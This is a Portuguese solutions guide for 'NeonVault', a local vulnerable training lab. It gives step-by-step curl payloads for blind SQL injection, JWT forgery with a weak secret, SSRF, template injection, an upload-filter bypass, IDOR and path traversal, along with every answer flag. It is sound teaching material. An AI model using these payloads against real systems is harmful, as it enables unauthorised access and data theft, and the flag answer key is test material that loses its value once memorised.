# Solutions — Lab 2 — NeonVault: Cyber Identity Breach

Este documento contém spoilers completos, payloads e flags. Use apenas em ambiente local autorizado.

## Pré-requisitos

- Docker e Docker Compose disponíveis
- `curl`
- Shell compatível com os comandos abaixo

Subir o lab:

```bash
cd lab-02-neonvault
docker compose up --build
```

Em outro terminal, criar uma sessão comum:

```bash
cd lab-02-neonvault
curl -i -c cookies.txt -X POST http://127.0.0.1:8092/login \
  -d "username=nova" \
  -d "password=nova2099"
```

Confirme o dashboard:

```bash
curl -i -b cookies.txt http://127.0.0.1:8092/dashboard
```

## 1. Time-Based Blind SQL Injection

### Objetivo

Extrair por tempo o código curto de recuperação do usuário administrativo e usá-lo no fluxo `/recover`.

### Rota

```text
GET /api/check-user?username=
POST /recover
```

### Passo a passo

O login principal rejeita payloads básicos. A superfície interessante fica no endpoint auxiliar de verificação de usuário.

Teste usuário existente e inexistente:

```bash
curl -sG http://127.0.0.1:8092/api/check-user --data-urlencode "username=nova"
curl -sG http://127.0.0.1:8092/api/check-user --data-urlencode "username=ghost"
```

Teste uma condição verdadeira com atraso:

```bash
time curl -sG http://127.0.0.1:8092/api/check-user \
  --data-urlencode "username=admin' AND IF(SUBSTR(recovery_code,1,1)='N',SLEEP(2),0)-- "
```

Teste uma condição falsa:

```bash
time curl -sG http://127.0.0.1:8092/api/check-user \
  --data-urlencode "username=admin' AND IF(SUBSTR(recovery_code,1,1)='X',SLEEP(2),0)-- "
```

Repita a técnica caractere por caractere:

```text
SUBSTR(recovery_code,1,1)='N'
SUBSTR(recovery_code,2,1)='3'
SUBSTR(recovery_code,3,1)='O'
SUBSTR(recovery_code,4,1)='N'
```

Use o código extraído:

```bash
curl -i -X POST http://127.0.0.1:8092/recover \
  -d "username=admin" \
  -d "recovery_code=N3ON"
```

### Evidência esperada

A resposta do `/recover` deve indicar que o código foi aceito para `admin`.

### Flag

```text
FLAG{blind_sqli_extracted_admin}
```

## 2. JWT Weak Secret / Token Forgery

### Objetivo

Forjar um JWT com `role=admin` usando o segredo fraco do lab e acessar o núcleo administrativo.

### Rota

```text
GET /admin/core
```

### Passo a passo

Com a sessão comum, confirme que o core bloqueia o usuário:

```bash
curl -i -b cookies.txt http://127.0.0.1:8092/admin/core
```

Gerar token forjado via Docker:

```bash
TOKEN=$(docker compose exec -T neonvault node -e "const jwt=require('jsonwebtoken'); console.log(jwt.sign({sub:2,username:'nova',displayName:'Nova Tanaka',role:'admin'}, 'neon'))")
```

Alternativa se estiver rodando sem Docker e com Node.js local:

```bash
TOKEN=$(node -e "const jwt=require('jsonwebtoken'); console.log(jwt.sign({sub:2,username:'nova',displayName:'Nova Tanaka',role:'admin'}, 'neon'))")
```

Acessar o core:

```bash
curl -i -H "Authorization: Bearer $TOKEN" http://127.0.0.1:8092/admin/core
```

### Evidência esperada

A página do Admin Core deve abrir e mostrar a evidência de acesso privilegiado.

### Flag

```text
FLAG{jwt_forged_neon_admin}
```

## 3. SSRF em Webhook Tester

### Objetivo

Usar o testador de webhook para fazer o servidor acessar um serviço interno que não está publicado no host.

### Rota

```text
POST /tools/webhook
```

### Passo a passo

Confirmar que a ferramenta exige login:

```bash
curl -i http://127.0.0.1:8092/tools/webhook
```

Consultar status interno via SSRF:

```bash
curl -i -b cookies.txt -X POST http://127.0.0.1:8092/tools/webhook \
  -d "url=http://127.0.0.1:5000/internal/status"
```

Consultar endpoint interno sensível:

```bash
curl -i -b cookies.txt -X POST http://127.0.0.1:8092/tools/webhook \
  -d "url=http://127.0.0.1:5000/internal/flag"
```

### Evidência esperada

A resposta da ferramenta deve incluir o corpo retornado pelo serviço interno.

### Flag

```text
FLAG{ssrf_internal_neon_service}
```

## 4. SSTI em Messages Preview

### Objetivo

Explorar renderização insegura de template no preview de mensagens.

### Rota

```text
POST /messages/preview
```

### Passo a passo

Provar avaliação de expressão:

```bash
curl -i -b cookies.txt -X POST http://127.0.0.1:8092/messages/preview \
  -d "template={{7*7}}"
```

Ler valor sensível disponível no contexto do template:

```bash
curl -i -b cookies.txt -X POST http://127.0.0.1:8092/messages/preview \
  -d "template={{vault.sstiSecret}}"
```

### Evidência esperada

O primeiro payload deve retornar `49`. O segundo deve revelar a evidência do contexto inseguro.

### Flag

```text
FLAG{ssti_template_breach}
```

## 5. File Upload Bypass

### Objetivo

Explorar validação fraca de nome/extensão no upload de avatar.

### Rota

```text
POST /avatar
GET /uploads/:name
```

### Passo a passo

Criar arquivo de teste controlado:

```bash
printf '<h1>NEON_UPLOAD_PROBE</h1>' > /tmp/badge.html
```

Enviar com nome aceito pelo filtro legado:

```bash
curl -i -b cookies.txt -X POST http://127.0.0.1:8092/avatar \
  -F "avatar=@/tmp/badge.html;filename=badge.html"
```

Outros nomes que exercitam o mesmo tipo de bypass:

```text
avatar.php.png
template.phtml
```

### Evidência esperada

A página deve indicar `Arquivo aceito`, mostrar o cache do upload e revelar a evidência do bypass.

### Flag

```text
FLAG{upload_filter_bypass}
```

## 6. SQL Injection em Filtro de Logs

### Objetivo

Manipular o filtro legado de logs para revelar entradas ocultas.

### Rota

```text
GET /logs?level=
```

### Passo a passo

Fluxo normal:

```bash
curl -i -b cookies.txt "http://127.0.0.1:8092/logs?level=error"
```

Filtro injetado:

```bash
curl -i -b cookies.txt -G http://127.0.0.1:8092/logs \
  --data-urlencode "level=error' OR '1'='1'-- "
```

### Evidencia esperada

O filtro normal mostra logs comuns. O filtro manipulado expande a listagem e revela o log oculto.

### Flag

```text
FLAG{logs_filter_sqli}
```

## 7. IDOR em API de Tickets

### Objetivo

Acessar objeto administrativo trocando o identificador numérico do ticket.

### Rota

```text
GET /api/tickets/:id
```

### Passo a passo

Ler um ticket comum:

```bash
curl -s -b cookies.txt http://127.0.0.1:8092/api/tickets/101
```

Trocar para o ticket administrativo:

```bash
curl -s -b cookies.txt http://127.0.0.1:8092/api/tickets/777
```

### Evidência esperada

O JSON do ticket administrativo deve ser retornado para o usuário comum, sem validação de dono do objeto.

### Flag

```text
FLAG{api_idor_object_leak}
```

## 8. Path Traversal com Logs e Backup

### Objetivo

Usar o downloader legado para ler arquivos fora do diretório público, seguir a pista de log e acessar o backup legado.

### Rota

```text
GET /download?file=
```

### Passo a passo

Arquivo normal:

```bash
curl -i "http://127.0.0.1:8092/download?file=report.pdf"
```

Ler log operacional fora da pasta pública:

```bash
curl -i "http://127.0.0.1:8092/download?file=../../var/log/neonvault/access.log"
```

O log aponta para:

```text
../../backup/legacy-admin-notes.bak
```

Ler o backup:

```bash
curl -i "http://127.0.0.1:8092/download?file=../../backup/legacy-admin-notes.bak"
```

### Evidência esperada

O backup legado deve ser retornado pelo downloader vulnerável.

### Flag

```text
FLAG{traversal_follow_the_logs}
```

## Checklist final de flags

```text
FLAG{blind_sqli_extracted_admin}
FLAG{jwt_forged_neon_admin}
FLAG{ssrf_internal_neon_service}
FLAG{ssti_template_breach}
FLAG{upload_filter_bypass}
FLAG{logs_filter_sqli}
FLAG{api_idor_object_leak}
FLAG{traversal_follow_the_logs}
```

## Troubleshooting

Ver containers:

```bash
docker compose ps
```

Ver logs do app:

```bash
docker compose logs -f
```

Rebuild limpo:

```bash
docker compose down
docker compose up --build
```

Se o token JWT não for gerado, confirme que o serviço se chama `neonvault`:

```bash
docker compose ps
```

Se as requisições autenticadas redirecionarem para `/login`, gere novamente o cookie:

```bash
curl -i -c cookies.txt -X POST http://127.0.0.1:8092/login \
  -d "username=nova" \
  -d "password=nova2099"
```
